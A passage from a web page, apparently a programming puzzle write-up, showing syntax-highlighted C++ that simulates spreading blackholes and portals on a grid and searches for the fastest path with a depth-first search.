<span class="line"><span style="color:#BD976A">                            valid_portals</span><span style="color:#666666">[</span><span style="color:#4C9A91">0</span><span style="color:#666666">][</span><span style="color:#DBD7CAEE">y</span><span style="color:#666666">][</span><span style="color:#DBD7CAEE">x</span><span style="color:#666666">]</span><span style="color:#666666"> =</span><span style="color:#4D9375"> true</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#BD976A">                            on_portal</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">y</span><span style="color:#666666">][</span><span style="color:#DBD7CAEE">x</span><span style="color:#666666">]</span><span style="color:#666666"> =</span><span style="color:#4D9375"> true</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#4D9375">                            goto</span><span style="color:#80A665"> found</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#666666">                        }</span></span>
<span class="line"><span style="color:#666666">                    }</span></span>
<span class="line"><span style="color:#666666">                }</span></span>
<span class="line"><span style="color:#80A665">                found</span><span style="color:#666666">:;</span></span>
<span class="line"><span style="color:#666666">            }</span></span>
<span class="line"><span style="color:#666666">        }</span></span>
<span class="line"><span style="color:#666666">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#4D9375">    for</span><span style="color:#666666"> (</span><span style="color:#CB7676">int</span><span style="color:#DBD7CAEE"> y </span><span style="color:#666666">=</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">;</span><span style="color:#DBD7CAEE"> y </span><span style="color:#CB7676">&#x3C;</span><span style="color:#DBD7CAEE"> H</span><span style="color:#666666">;</span><span style="color:#DBD7CAEE"> y</span><span style="color:#CB7676">++</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#4D9375">        for</span><span style="color:#666666"> (</span><span style="color:#CB7676">int</span><span style="color:#DBD7CAEE"> x </span><span style="color:#666666">=</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">;</span><span style="color:#DBD7CAEE"> x </span><span style="color:#CB7676">&#x3C;</span><span style="color:#DBD7CAEE"> W</span><span style="color:#666666">;</span><span style="color:#DBD7CAEE"> x</span><span style="color:#CB7676">++</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#4D9375">            if</span><span style="color:#666666"> (</span><span style="color:#BD976A">grid</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">y</span><span style="color:#666666">][</span><span style="color:#DBD7CAEE">x</span><span style="color:#666666">]</span><span style="color:#CB7676"> !=</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">&#x26;</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#BD976A">                grid</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">y</span><span style="color:#666666">][</span><span style="color:#DBD7CAEE">x</span><span style="color:#666666">]</span><span style="color:#666666"> =</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">.</span><span style="color:#C98A7D77">'</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#666666">            }</span></span>
<span class="line"><span style="color:#666666">        }</span></span>
<span class="line"><span style="color:#666666">    }</span></span>
<span class="line"></span></code></pre>
<p>We simulate the blackholes to get the <code>time_grid</code> and the <code>valid_portals</code> (we cannot do this separately, as I initially did, because if a blackhole ends up on a portal, not only it destroies it and its twin, but the twin-portal becomes a blackhole as well):</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="cpp"><code><span class="line"><span style="color:#4D9375">    for</span><span style="color:#666666"> (</span><span style="color:#CB7676">int</span><span style="color:#DBD7CAEE"> i </span><span style="color:#666666">=</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">;</span><span style="color:#DBD7CAEE"> i </span><span style="color:#CB7676">&#x3C;</span><span style="color:#DBD7CAEE"> MAX </span><span style="color:#CB7676">-</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">;</span><span style="color:#DBD7CAEE"> i</span><span style="color:#CB7676">++</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#BD976A">        time_grid</span><span style="color:#666666">.</span><span style="color:#80A665">push_back</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">grid</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#80A665">        bh_step</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">i </span><span style="color:#CB7676">+</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#666666">    }</span></span>
<span class="line"><span style="color:#DBD7CAEE">...</span></span>
<span class="line"><span style="color:#CB7676">const</span><span style="color:#CB7676"> int</span><span style="color:#BD976A"> dy</span><span style="color:#666666">[</span><span style="color:#4C9A91">8</span><span style="color:#666666">]</span><span style="color:#666666"> =</span><span style="color:#666666"> {</span><span style="color:#CB7676">-</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">,</span><span style="color:#CB7676"> -</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">,</span><span style="color:#CB7676"> -</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">};</span></span>
<span class="line"><span style="color:#CB7676">const</span><span style="color:#CB7676"> int</span><span style="color:#BD976A"> dx</span><span style="color:#666666">[</span><span style="color:#4C9A91">8</span><span style="color:#666666">]</span><span style="color:#666666"> =</span><span style="color:#666666"> {</span><span style="color:#CB7676">-</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#CB7676"> -</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#CB7676"> -</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">};</span></span>
<span class="line"></span>
<span class="line"><span style="color:#CB7676">void</span><span style="color:#80A665"> bh_step</span><span style="color:#666666">(</span><span style="color:#CB7676">int</span><span style="color:#BD976A"> t</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#DBD7CAEE">    vector </span><span style="color:#CB7676">&#x3C;</span><span style="color:#DBD7CAEE">string</span><span style="color:#CB7676">></span><span style="color:#80A665"> new_board</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">H</span><span style="color:#666666">,</span><span style="color:#80A665"> string</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">W</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">.</span><span style="color:#C98A7D77">'</span><span style="color:#666666">));</span></span>
<span class="line"></span>
<span class="line"><span style="color:#4D9375">    for</span><span style="color:#666666"> (</span><span style="color:#CB7676">int</span><span style="color:#DBD7CAEE"> y </span><span style="color:#666666">=</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">;</span><span style="color:#DBD7CAEE"> y </span><span style="color:#CB7676">&#x3C;</span><span style="color:#DBD7CAEE"> H</span><span style="color:#666666">;</span><span style="color:#DBD7CAEE"> y</span><span style="color:#CB7676">++</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#4D9375">        for</span><span style="color:#666666"> (</span><span style="color:#CB7676">int</span><span style="color:#DBD7CAEE"> x </span><span style="color:#666666">=</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">;</span><span style="color:#DBD7CAEE"> x </span><span style="color:#CB7676">&#x3C;</span><span style="color:#DBD7CAEE"> W</span><span style="color:#666666">;</span><span style="color:#DBD7CAEE"> x</span><span style="color:#CB7676">++</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#CB7676">            int</span><span style="color:#DBD7CAEE"> neigh </span><span style="color:#666666">=</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#4D9375">            for</span><span style="color:#666666"> (</span><span style="color:#CB7676">int</span><span style="color:#DBD7CAEE"> i </span><span style="color:#666666">=</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">;</span><span style="color:#DBD7CAEE"> i </span><span style="color:#CB7676">&#x3C;</span><span style="color:#4C9A91"> 8</span><span style="color:#666666">;</span><span style="color:#DBD7CAEE"> i</span><span style="color:#CB7676">++</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#CB7676">                int</span><span style="color:#DBD7CAEE"> ny </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> y </span><span style="color:#CB7676">+</span><span style="color:#BD976A"> dy</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">i</span><span style="color:#666666">],</span><span style="color:#DBD7CAEE"> nx </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> x </span><span style="color:#CB7676">+</span><span style="color:#BD976A"> dx</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">i</span><span style="color:#666666">];</span></span>
<span class="line"><span style="color:#4D9375">                if</span><span style="color:#666666"> (</span><span style="color:#DBD7CAEE">ny </span><span style="color:#CB7676">&#x3C;</span><span style="color:#4C9A91"> 0</span><span style="color:#CB7676"> ||</span><span style="color:#DBD7CAEE"> ny </span><span style="color:#CB7676">>=</span><span style="color:#DBD7CAEE"> H </span><span style="color:#CB7676">||</span><span style="color:#DBD7CAEE"> nx </span><span style="color:#CB7676">&#x3C;</span><span style="color:#4C9A91"> 0</span><span style="color:#CB7676"> ||</span><span style="color:#DBD7CAEE"> nx </span><span style="color:#CB7676">>=</span><span style="color:#DBD7CAEE"> W</span><span style="color:#666666">)</span><span style="color:#4D9375"> continue</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#DBD7CAEE">                neigh </span><span style="color:#CB7676">+=</span><span style="color:#BD976A"> grid</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">ny</span><span style="color:#666666">][</span><span style="color:#DBD7CAEE">nx</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">&#x26;</span><span style="color:#C98A7D77">'</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#666666">            }</span></span>
<span class="line"><span style="color:#4D9375">            if</span><span style="color:#666666"> (</span><span style="color:#BD976A">grid</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">y</span><span style="color:#666666">][</span><span style="color:#DBD7CAEE">x</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">&#x26;</span><span style="color:#C98A7D77">'</span><span style="color:#CB7676"> &#x26;&#x26;</span><span style="color:#666666"> (</span><span style="color:#DBD7CAEE">neigh </span><span style="color:#CB7676">==</span><span style="color:#4C9A91"> 2</span><span style="color:#CB7676"> ||</span><span style="color:#DBD7CAEE"> neigh </span><span style="color:#CB7676">==</span><span style="color:#4C9A91"> 3</span><span style="color:#666666">))</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#BD976A">                new_board</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">y</span><span style="color:#666666">][</span><span style="color:#DBD7CAEE">x</span><span style="color:#666666">]</span><span style="color:#666666"> =</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">&#x26;</span><span style="color:#C98A7D77">'</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#666666">            }</span><span style="color:#4D9375"> else</span><span style="color:#4D9375"> if</span><span style="color:#666666"> (</span><span style="color:#BD976A">grid</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">y</span><span style="color:#666666">][</span><span style="color:#DBD7CAEE">x</span><span style="color:#666666">]</span><span style="color:#CB7676"> !=</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">&#x26;</span><span style="color:#C98A7D77">'</span><span style="color:#CB7676"> &#x26;&#x26;</span><span style="color:#DBD7CAEE"> neigh </span><span style="color:#CB7676">>=</span><span style="color:#4C9A91"> 3</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#BD976A">                new_board</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">y</span><span style="color:#666666">][</span><span style="color:#DBD7CAEE">x</span><span style="color:#666666">]</span><span style="color:#666666"> =</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">&#x26;</span><span style="color:#C98A7D77">'</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#666666">            }</span></span>
<span class="line"><span style="color:#666666">        }</span></span>
<span class="line"><span style="color:#666666">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#4D9375">    for</span><span style="color:#666666"> (</span><span style="color:#CB7676">int</span><span style="color:#DBD7CAEE"> y </span><span style="color:#666666">=</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">;</span><span style="color:#DBD7CAEE"> y </span><span style="color:#CB7676">&#x3C;</span><span style="color:#DBD7CAEE"> H</span><span style="color:#666666">;</span><span style="color:#DBD7CAEE"> y</span><span style="color:#CB7676">++</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#4D9375">        for</span><span style="color:#666666"> (</span><span style="color:#CB7676">int</span><span style="color:#DBD7CAEE"> x </span><span style="color:#666666">=</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">;</span><span style="color:#DBD7CAEE"> x </span><span style="color:#CB7676">&#x3C;</span><span style="color:#DBD7CAEE"> W</span><span style="color:#666666">;</span><span style="color:#DBD7CAEE"> x</span><span style="color:#CB7676">++</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#4D9375">            if</span><span style="color:#666666"> (</span><span style="color:#CB7676">!</span><span style="color:#BD976A">valid_portals</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">t </span><span style="color:#CB7676">-</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">][</span><span style="color:#DBD7CAEE">y</span><span style="color:#666666">][</span><span style="color:#DBD7CAEE">x</span><span style="color:#666666">])</span><span style="color:#4D9375"> continue</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#4D9375">            if</span><span style="color:#666666"> (</span><span style="color:#BD976A">new_board</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">y</span><span style="color:#666666">][</span><span style="color:#DBD7CAEE">x</span><span style="color:#666666">]</span><span style="color:#CB7676"> !=</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">&#x26;</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#BD976A">                valid_portals</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">t</span><span style="color:#666666">][</span><span style="color:#DBD7CAEE">y</span><span style="color:#666666">][</span><span style="color:#DBD7CAEE">x</span><span style="color:#666666">]</span><span style="color:#666666"> =</span><span style="color:#4D9375"> true</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#666666">            }</span></span>
<span class="line"><span style="color:#666666">        }</span></span>
<span class="line"><span style="color:#666666">    }</span></span>
<span class="line"><span style="color:#4D9375">    for</span><span style="color:#666666"> (</span><span style="color:#CB7676">int</span><span style="color:#DBD7CAEE"> y </span><span style="color:#666666">=</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">;</span><span style="color:#DBD7CAEE"> y </span><span style="color:#CB7676">&#x3C;</span><span style="color:#DBD7CAEE"> H</span><span style="color:#666666">;</span><span style="color:#DBD7CAEE"> y</span><span style="color:#CB7676">++</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#4D9375">        for</span><span style="color:#666666"> (</span><span style="color:#CB7676">int</span><span style="color:#DBD7CAEE"> x </span><span style="color:#666666">=</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">;</span><span style="color:#DBD7CAEE"> x </span><span style="color:#CB7676">&#x3C;</span><span style="color:#DBD7CAEE"> W</span><span style="color:#666666">;</span><span style="color:#DBD7CAEE"> x</span><span style="color:#CB7676">++</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#4D9375">            if</span><span style="color:#666666"> (</span><span style="color:#BD976A">valid_portals</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">t</span><span style="color:#666666">][</span><span style="color:#DBD7CAEE">y</span><span style="color:#666666">][</span><span style="color:#DBD7CAEE">x</span><span style="color:#666666">]</span><span style="color:#CB7676"> &#x26;&#x26;</span><span style="color:#CB7676"> !</span><span style="color:#BD976A">valid_portals</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">t</span><span style="color:#666666">][</span><span style="color:#BD976A">portals</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">y</span><span style="color:#666666">][</span><span style="color:#DBD7CAEE">x</span><span style="color:#666666">].</span><span style="color:#BD976A">first</span><span style="color:#666666">][</span><span style="color:#BD976A">portals</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">y</span><span style="color:#666666">][</span><span style="color:#DBD7CAEE">x</span><span style="color:#666666">].</span><span style="color:#BD976A">second</span><span style="color:#666666">])</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#BD976A">                valid_portals</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">t</span><span style="color:#666666">][</span><span style="color:#DBD7CAEE">y</span><span style="color:#666666">][</span><span style="color:#DBD7CAEE">x</span><span style="color:#666666">]</span><span style="color:#666666"> =</span><span style="color:#4D9375"> false</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#BD976A">                new_board</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">y</span><span style="color:#666666">][</span><span style="color:#DBD7CAEE">x</span><span style="color:#666666">]</span><span style="color:#666666"> =</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">&#x26;</span><span style="color:#C98A7D77">'</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#666666">            }</span></span>
<span class="line"><span style="color:#666666">        }</span></span>
<span class="line"><span style="color:#666666">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">    grid </span><span style="color:#666666">=</span><span style="color:#80A665"> move</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">new_board</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#666666">}</span></span>
<span class="line"></span></code></pre>
<p>Finally we can do the search:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="cpp"><code><span class="line"><span style="color:#DBD7CAEE">    string res </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> ""</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#80A665">    dfs</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">start_y</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> start_x</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> res</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#DBD7CAEE">...</span></span>
<span class="line"><span style="color:#CB7676">const</span><span style="color:#CB7676"> int</span><span style="color:#BD976A"> Dy</span><span style="color:#666666">[</span><span style="color:#4C9A91">4</span><span style="color:#666666">]</span><span style="color:#666666"> =</span><span style="color:#666666"> {</span><span style="color:#CB7676">-</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">},</span><span style="color:#BD976A"> Dx</span><span style="color:#666666">[</span><span style="color:#4C9A91">4</span><span style="color:#666666">]</span><span style="color:#666666"> =</span><span style="color:#666666"> {</span><span style="color:#4C9A91">0</span><span style="color:#666666">,</span><span style="color:#CB7676"> -</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">};</span></span>
<span class="line"><span style="color:#CB7676">const</span><span style="color:#DBD7CAEE"> string </span><span style="color:#BD976A">dir</span><span style="color:#666666">[</span><span style="color:#4C9A91">4</span><span style="color:#666666">]</span><span style="color:#666666"> =</span><span style="color:#666666"> {</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">N</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">W</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">E</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">S</span><span style="color:#C98A7D77">"</span><span style="color:#666666">};</span></span>
<span class="line"></span>
<span class="line"><span style="color:#CB7676">void</span><span style="color:#80A665"> dfs</span><span style="color:#666666">(</span><span style="color:#CB7676">int</span><span style="color:#BD976A"> y</span><span style="color:#666666">,</span><span style="color:#CB7676"> int</span><span style="color:#BD976A"> x</span><span style="color:#666666">,</span><span style="color:#CB7676"> int</span><span style="color:#BD976A"> t</span><span style="color:#666666">,</span><span style="color:#CB7676"> int</span><span style="color:#BD976A"> n_portals</span><span style="color:#666666">,</span><span style="color:#5DA994"> string</span><span style="color:#CB7676">&#x26;</span><span style="color:#BD976A"> path</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#4D9375">    if</span><span style="color:#666666"> (</span><span style="color:#DBD7CAEE">t </span><span style="color:#CB7676">></span><span style="color:#DBD7CAEE"> best_time</span><span style="color:#666666">)</span><span style="color:#4D9375"> return</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#4D9375">    if</span><span style="color:#666666"> (</span><span style="color:#BD976A">time_grid</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">t</span><span style="color:#666666">][</span><span style="color:#DBD7CAEE">y</span><span style="color:#666666">][</span><span style="color:#DBD7CAEE">x</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">&#x26;</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span><span style="color:#4D9375"> return</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#4D9375">    if</span><span style="color:#666666"> (</span><span style="color:#DBD7CAEE">y </span><span style="color:#CB7676">==</span><span style="color:#DBD7CAEE"> end_y </span><span style="color:#CB7676">&#x26;&#x26;</span><span style="color:#DBD7CAEE"> x </span><span style="color:#CB7676">==</span><span style="color:#DBD7CAEE"> end_x</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#4D9375">        if</span><span style="color:#666666"> (</span><span style="color:#DBD7CAEE">t </span><span style="color:#CB7676">&#x3C;</span><span style="color:#DBD7CAEE"> best_time</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#DBD7CAEE">            best_time </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> t</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#DBD7CAEE">            best_portals </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> n_portals</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#DBD7CAEE">            n_sols </span><span style="color:#666666">=</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#BD976A">            paths</span><span style="color:#666666">.</span><span style="color:#80A665">clear</span><span style="color:#666666">();</span></span>
<span class="line"><span style="color:#BD976A">            paths</span><span style="color:#666666">.</span><span style="color:#80A665">push_back</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">path</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#666666">        }</span><span style="color:#4D9375"> else</span><span style="color:#4D9375"> if</span><span style="color:#666666"> (</span><span style="color:#DBD7CAEE">t </span><span style="color:#CB7676">==</span><span style="color:#DBD7CAEE"> best_time </span><span style="color:#CB7676">&#x26;&#x26;</span><span style="color:#DBD7CAEE"> n_portals </span><span style="color:#CB7676">></span><span style="color:#DBD7CAEE"> best_portals</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#DBD7CAEE">            best_portals </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> n_portals</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#DBD7CAEE">            n_sols </span><span style="color:#666666">=</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#BD976A">            paths</span><span style="color:#666666">.</span><span style="color:#80A665">clear</span><span style="color:#666666">();</span></span>
<span class="line"><span style="color:#BD976A">            paths</span><span style="color:#666666">.</span><span style="color:#80A665">push_back</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">path</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#666666">        }</span><span style="color:#4D9375"> else</span><span style="color:#4D9375"> if</span><span style="color:#666666"> (</span><span style="color:#DBD7CAEE">t </span><span style="color:#CB7676">==</span><span style="color:#DBD7CAEE"> best_time </span><span style="color:#CB7676">&#x26;&#x26;</span><span style="color:#DBD7CAEE"> n_portals </span><span style="color:#CB7676">==</span><span style="color:#DBD7CAEE"> best_portals</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#DBD7CAEE">            n_sols</span><span style="color:#CB7676">++</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#BD976A">            paths</span><span style="color:#666666">.</span><span style="color:#80A665">push_back</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">path</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#666666">        }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#4D9375">        return</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#666666">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#4D9375">    if</span><span style="color:#666666"> (</span><span style="color:#BD976A">visited</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">y</span><span style="color:#666666">][</span><span style="color:#DBD7CAEE">x</span><span style="color:#666666">])</span><span style="color:#4D9375"> return</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#BD976A">    visited</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">y</span><span style="color:#666666">][</span><span style="color:#DBD7CAEE">x</span><span style="color:#666666">]</span><span style="color:#666666"> =</span><span style="color:#4D9375"> true</span><span style="color:#666666">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#4D9375">    for</span><span style="color:#666666"> (</span><span style="color:#CB7676">int</span><span style="color:#DBD7CAEE"> i </span><span style="color:#666666">=</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">;</span><span style="color:#DBD7CAEE"> i </span><span style="color:#CB7676">&#x3C;</span><span style="color:#4C9A91"> 4</span><span style="color:#666666">;</span><span style="color:#DBD7CAEE"> i</span><span style="color:#CB7676">++</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#CB7676">        int</span><span style="color:#DBD7CAEE"> ny </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> y </span><span style="color:#CB7676">+</span><span style="color:#BD976A"> Dy</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">i</span><span style="color:#666666">],</span><span style="color:#DBD7CAEE"> nx </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> x </span><span style="color:#CB7676">+</span><span style="color:#BD976A"> Dx</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">i</span><span style="color:#666666">];</span></span>
<span class="line"><span style="color:#4D9375">        if</span><span style="color:#666666"> (</span><span style="color:#DBD7CAEE">ny </span><span style="color:#CB7676">&#x3C;</span><span style="color:#4C9A91"> 0</span><span style="color:#CB7676"> ||</span><span style="color:#DBD7CAEE">  ny </span><span style="color:#CB7676">>=</span><span style="color:#DBD7CAEE"> H </span><span style="color:#CB7676">||</span><span style="color:#DBD7CAEE"> nx </span><span style="color:#CB7676">&#x3C;</span><span style="color:#4C9A91"> 0</span><span style="color:#CB7676"> ||</span><span style="color:#DBD7CAEE"> nx </span><span style="color:#CB7676">>=</span><span style="color:#DBD7CAEE"> W </span><span style="color:#CB7676">||</span><span style="color:#BD976A"> time_grid</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">t</span><span style="color:#666666">][</span><span style="color:#DBD7CAEE">ny</span><span style="color:#666666">][</span><span style="color:#DBD7CAEE">nx</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">&#x26;</span><span style="color:#C98A7D77">'</span><span style="color:#CB7676"> ||</span><span style="color:#BD976A"> visited</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">ny</span><span style="color:#666666">][</span><span style="color:#DBD7CAEE">nx</span><span style="color:#666666">])</span><span style="color:#4D9375"> continue</span><span style="color:#666666">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">        path </span><span style="color:#CB7676">+=</span><span style="color:#BD976A"> dir</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">i</span><span style="color:#666666">];</span></span>
